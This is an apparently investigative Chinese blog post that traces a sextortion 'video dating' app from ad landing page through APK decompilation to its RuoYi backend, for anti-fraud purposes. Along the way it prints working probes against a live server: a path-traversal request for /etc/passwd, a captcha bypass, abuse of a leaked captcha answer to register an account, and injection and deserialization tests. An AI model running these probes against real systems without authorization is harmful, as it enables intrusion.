---
layout: post
title: 一个裸聊敲诈 App 的完整溯源：从广告落地页到素材库
summary: 朋友装了个“视频交友”App，没敢登录就丢给我。从落地页开始，一路拆到它的服务端和对象存储：随机包名的马甲、两套签名同一份代码、按秒计费的视频，以及一个匿名就能读受害者相册的桶。这篇把过程中的动作、命令和踩到的坑都写下来。
tags: 溯源 Android 反诈
date: 2026-10-21 15:00:00 +0800
---

朋友前几天发来一个安装包，说是在短视频广告里点到的，“视频交友”，装完就让给通讯录权限。

他也是做安全的，没敢登录，丢给我看。我拿一台干净手机跑了一遍，顺手把它服务端也摸了一圈。

下面按我实际的顺序写：怎么找到它的资产、怎么拆的包、怎么认出后台框架、自动化检测在哪儿踩了坑。域名、证书编号、账号这些我换成了占位，手法和命令保留。

## 一、先解决一个不属于目标的问题

起手就卡了一下：本地解析不了它的域名，所有域名访问都失败。查下来是这台机器的解析走到了虚拟网关，对这类域名返回了个坏地址。

绕法是跳过本地解析，直接问公共 DNS，再用 `--resolve` 把地址钉住：

```bash
dig +short www.<分发域> A @8.8.8.8
curl -sk --resolve "www.<分发域>:443:<IP>" "https://www.<分发域>/"
```

这一步很值得记：后面所有域名操作都靠它。不解决这个，你看到的所有"页面不对/响应异常"都可能只是自己的网络问题——我第一次换 UA 看到响应长度变化，差点当成"它按 UA 分流发不同的包"，核对之后发现是 DNS 落到不同 IP 上去了。

## 二、资产面：随机子域，字典没用

域名从两个地方拿到：落地页的链接，和 APK 里写死的地址。核心三个——分发站、App 接口、管理后台。

子域枚举走了两条被动路：证书透明度日志和被动收集：

```bash
curl -s "https://crt.sh/?q=%25.<主域>&output=json"
subfinder -d <主域> -silent
```

结果是有用但不大：十六个随机子域，命名毫无规律（`aaa-bbbb.cc`、`ddd-eeee` 这种），字典爆破完全无效。子域跟业务角色的对应关系，只能靠逐个访问、看响应特征来定。

端口这块踩了个正经的坑。先按常规上全端口扫描：

```bash
nmap -p- --min-rate 2000 <分发站 IP>
```

结果漏报了实际开着的 22/80/443，日志里是 `giving up on port because retransmission cap hit`。换单连接逐个确认：

```bash
for p in 22 80 443; do
  timeout 3 bash -c "echo > /dev/tcp/<IP>/$p" 2>/dev/null && echo "$p open"
done
```

这才对。**这个目标不适用全端口扫描**，它的限速策略会让扫描器自己放弃端口，报出来的"关闭"是假的。

## 三、分发链：四跳，六条线路四条已死

桌面浏览器打开落地页只有一个静态页，没有下载入口。它判断设备，只有手机 UA 才往下走。逐级试出来是四跳：

```
index.php?m=1&v=<版本号>
enter.php?confirm=1&intent=friend&v=<版本号>
landing.php
link.php?u=<槽位>
```

`m`、`intent`、`v`、`u` 全部是参数化或白名单，注入这条线直接放弃。

`u` 收 main/backup/url1~url4 六个槽位。我逐个访问：

| 槽位 | 结果 |
|---|---|
| main / url4 | 无 A 记录（废的） |
| backup / url2 | 无 A 记录（废的） |
| url1 / url3 | 302 到 CDN，再落到对象存储 |

六条线里四条已经死了。这说明**线路对它们是消耗品**——封一个换一个，死了的不维护。顺着 302 一路跟下去，安装包其实存在对象存储里，对象名伪装成 `v1/<随机串>.db`，靠 `responseContentDisposition` 强制改名成 apk。

```bash
curl -sIL "<对象存储直链>" | grep -iE "location|content-disposition|content-length"
```

## 四、拆包：全部走脚本，不进图形界面

反编译没开 jadx 的界面，直接用 androguard 写脚本处理——两个样本、几千个类，图形界面点到手断，脚本能批量。

```bash
python -m venv venv && ./venv/bin/pip install androguard
```

```python
from androguard.core.apk import APK
a = APK("sample.apk")
a.get_permissions()      # 41 项
a.get_main_activity()
a.get_activities(); a.get_services(); a.get_receivers(); a.get_providers()
```

41 项权限里最关键的是通讯录、相册、摄像头、录音、`FOREGROUND_SERVICE_MEDIA_PROJECTION`（录屏）和 `QUERY_ALL_PACKAGES`。值得注意的是**没有**的东西：不读短信、不读通话记录、没有无障碍服务。也就是说它不靠"帮你操作手机"，它只负责**把你手机里的东西搬走**。

看签名时还看到一个残留：`bin.mt.file.content.MTDataFilesProvider`——这是用 MT 管理器批量改包留下的类。改包的人连清理都没做。

接口是从 dex 的字符串表里捞的：

```bash
grep -oE "/moos/[A-Za-z0-9_/\-]+" dex_strings.txt | sort -u   # 38 个业务接口
```

参数名没有靠猜。对关键类逐个方法打常量池，把 `const-string` 全打出来：

```python
for c in d.get_classes():
    if c.get_name() != "Lcom/...;": continue
    for m in c.get_methods():
        code = m.get_code()
        if not code: continue
        for ins in code.get_bc().get_instructions():
            if ins.get_name() == "const-string":
                print(hex(m.get_code().get_offset()), ins.get_output())
```

用这招拿到了 `/moos/rtc/session` 的完整参数结构：`channelName`、`peerUserId`、`sessionTicket`、`admissionId`、`forceTakeover`、`takeoverRef`。少猜十几个字段名，就是少几十发无用请求。

采集逻辑也是这么定位的：

- `AlbumUploadService`：遍历 `MediaStore.EXTERNAL`，按 `date_added DESC` 全量上传，命名 `upload_yyyyMMdd_HHmmss.jpg`，带去重标记和失败重试；
- `PersonalInforDetailsActivity.uploadContactBatches`：分批上报通讯录到 `/moos/upload/moos_info`，字段是 `contactDtoList{name,phone,contactType}`。

顺便纠正过自己一次：一开始把 `/moos/upload/contact_sync_log` 当成了通讯录上报接口，核对方法体后确认它只传诊断日志。

两个样本的比对很简单，但结论很硬：

```bash
unzip -o sample.apk -d a/ && unzip -o sample2.apk -d b/
md5sum a/classes*.dex b/classes*.dex
```

**dex 逐字节相同**，只有包名和签名不同。同一份代码，两套签名，两家不同国家的空壳公司——平台养代理，抓到的永远是最外层。

## 五、服务端：两个节点，一个有防护一个没有

框架认起来很快：

```bash
curl -s "https://pc.<后台域>/captchaImage" | head -c 200
```

返回体里有 `captchaOnOff` 字段，这是若依（RuoYi-Vue）系列的标志。再用一个不存在的账号打登录，返回的 401 文案也是框架内置的。

真正有用的是**同一路径在两个节点上的差异**：

```bash
curl -sk -o /dev/null -w "%{http_code}\n" --path-as-is \
  "https://pc.<后台域>/common/download/resource?resource=/profile/../../etc/passwd"
# → 403，HTML 拦截页

curl -sk -o /dev/null -w "%{http_code}\n" --path-as-is \
  "https://<另一个节点>:28443/common/download/resource?resource=/profile/../../etc/passwd"
# → 401，JSON，应用层响应
```

一个回拦截页，一个回业务 JSON。**这说明第二个节点前面没有边缘防护**——后面的应用层测试全部走这个入口，看到的东西才是应用自己的反应。

## 六、认证：验证码的答案跟着图片一起返回

登录先测验证码在不在：

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"x","password":"y"}' "https://<host>/login"
# → {"msg":"验证码已失效","code":500}

curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"x","password":"y","source":"APP"}' "https://<host>/login"
# → {"msg":"账号或密码错误","code":500}
```

带 `source=APP` 就跳过验证码了。连续错五次会锁 IP 一小时，看到这句我就停了登录，改走注册。

注册这条更省事的发现：

```bash
curl -s "https://<host>/app/register/captchaImage?mobile=11111111113"
```

响应里除了图片，还有一个 `imgCode` 字段——**验证码答案本身**。配合手机号不校验，注册零成本：

```bash
curl -s -X POST "https://<host>/register" -H "Content-Type: application/json" -d '{
  "username":"11111111199","phonenumber":"11111111199","password":"<自设>",
  "code":"<imgCode>","uuid":"<uuid>","deviceId":"test-evidence-0001",
  "installId":"ev-install-0001","channelCode":""}'
# → {"code":200,"data":{"token":"eyJhbGciOiJIUzUxMiJ9..."}}
```

拿到的账号 `permissions` 和 `roles` 都是空数组，就是个普通会员。

## 七、自动化检测：命令行模式在这里是白跑的

这一步踩了最值的坑。

先按常规对接口做命令行扫描，结果 635 发请求全部无命中。原因很简单：**命令行模式的注入落在 URL 查询参数上，而它的接口几乎全部从 JSON 请求体读参数**。参数根本没被碰到，扫一百遍也是零。

改成代理模式：启动一个本地代理，把真实的请求（带正确的 JSON body、正确的 token）从代理发出去，让检测引擎对着**流过它的真实报文**做检测。

```bash
curl -s -x "http://127.0.0.1:<port>" -k \
  -H "Authorization: Bearer $T" -H "Content-Type: application/json" \
  -d '{"trendId":2078}' "https://<host>/moos/trend/queryTrendDetail"
```

这里还有三个细节：

**一，别传多余参数。**我一开始把检测项、速率、证书导出这些参数都传进去，结果代理退化成纯转发，检测队列一条都没有。只保留目标范围与证书容错两项，才开始正常工作。

**二，投喂要慢。**间隔 0.8 秒时投了 11 个端点只收到 5 个；改成 3 秒一次，全部收下了。

**三，结束看队列，不看表。**单个端点整套检测跑完约 54 秒，12 个端点接近 11 分钟。我第一次 114 秒就以为跑完了。判断是否结束，要看引擎自己给的两个数字：`items_total` 等于投喂的端点数、`new_items_waiting` 归零，才算完成。

## 八、一条误报是怎么排除的

引擎报 `forceTakeover` 参数"存在反序列化"。这个要复核，因为参数名带 `force`、`takeover`，很容易被当作对象字段。

做法是改数据类型和编码，看响应有没有走进新的执行路径：

```bash
-d '{"channelName":"t","peerUserId":<id>,"forceTakeover":false}'          # 业务错误 46001
-d '{"channelName":"t","peerUserId":<id>,"forceTakeover":"false"}'        # 正常转换
-d '{"channelName":"t","peerUserId":<id>,"forceTakeover":"rO0ABXNy..."}' # InvalidFormatException
-d '{"channelName":"t","peerUserId":<id>,"forceTakeover":{"a":1}}'        # MismatchedInputException
```

传 Java 序列化流那一下，服务端只回了 `InvalidFormatException`——它在把字符串转成 `Boolean` 时失败了，根本没走到反序列化。所以这不是反序列化漏洞，**只是错误信息把内部类名和字段类型返回给了客户端**，属于信息泄露。

这一步很关键：反序列化的 payload 一旦被当真，后面所有判断都会歪。误报不可怕，不复核才可怕。

## 九、五个让我差点判错的点

**一，这台机器所有业务错误都返回 HTTP 200。**认证失败是 `200` + `{"code":401}`。看状态码判结果，必然错。

**二，未认证的 401/403 不能证明接口存在。**同一个路径：不带 token 是 401，带上 token 是 404——说明它压根不存在。我第一版据此规划了一堆"待认证后可攻"的路径，带凭据复测后全废。

**三，注入位置错了，结论就是零。**见第七节，635 发白跑。

**四，列表接口的响应结构不统一。**动态列表是顶层 `total`/`rows`，其他接口是 `data.rows`。按习惯取 `data.rows` 会读出空值，然后被我当成"没有数据"。

**五，扫描类操作要按队列等，不能按经验截断。**见第七节。

## 十、边界：哪些事我做了，哪些没做

这类目标是黑产在运营的活系统，动作上的自律不是客气，是免得把自己变成另一个加害者：

- 只读优先，全程只创建了 1 个测试账号，没改任何服务端数据；
- 注册用明显伪造的号码，不用真实手机号，也不去收短信；
- 越权测试里一旦返回了别人的数据就停，只记字段名和长度；
- 对象存储只验证"能不能访问"（状态码、字节数），**不下载任何图片和视频**；
- 群需要审批、申请会通知群主，所以没申请；
- `forceTakeover` 全程保持 `false`，没有接管任何真实会话；
- 登录错五次会锁 IP，看到就停，改走注册。

## 十一、它暴露的运营方式

翻用户字段时看到的这组东西，比漏洞更能说明问题（值都换过）：

```json
"personnelType": "GONGZUO",
"personnelAssignBy": "admin",
"workerDurationDays": 5,
"workerExpireTime": "2026-10-22",
"workerFrozenAt": "2026-10-19 17:34",
"workerUnfrozenAt": "2026-10-20 16:30",
"invitationCode": "<邀请码>"
```

翻译：员工账号由管理员统一建，**有效期五天**，能冻结、能解冻，靠邀请码拉人。系统里把人分成"员工"和"客户"两类。

另一个接口返回十三个群，按地区分：河北旅游圈、北京骑行聚集地、重庆小吃交流群……每群显示 999 人，入群要审批。分两批建，隔一个月，第二批换了群主，群名前加个"新"字。

地区群 + 生活化群名 + 审批入群，这不是交友，是**按地区囤人**。被视频敲诈之后，第二波就从这些群里来。

## 十二、能推动处置的三件事

技术侧挖到这里，真正能落地的是：

- 安装包走 iOS 企业证书（In-House）分发，证书主体是一家与本业务完全无关的境外公司，大概率是被冒用或出借。吊销它，iOS 这条线就断了，比封域名持久。
- 它的聊天能力接在一家云服务商的 IM 上，有应用标识、群主账号、群 ID——这些都是可调证的标识，群里就是受害者与员工的名单。
- 域名里有两个是刚注册的，注册商是境内实体，这是整条链上唯一能落到实名的环节。

至于 App 自己那几个缺陷（验证码明文、手机号不校验、桶可匿名读、CORS 反射 Origin、按 source 跳过验证码、异常吐内部类名），修起来都简单。它们不会修——修了也不影响换个马甲。

## 最后三句给普通人

**只对手机放行、桌面打不开的安装包，先当它有问题。**

**要通讯录权限的交友 App，一律不给。**

**“免费试看一次”后面是按秒计费**，计时器在它那边。

删掉 App 没用，通讯录早就在对面服务器上了。所以别从广告里点安装包，一条都别点。
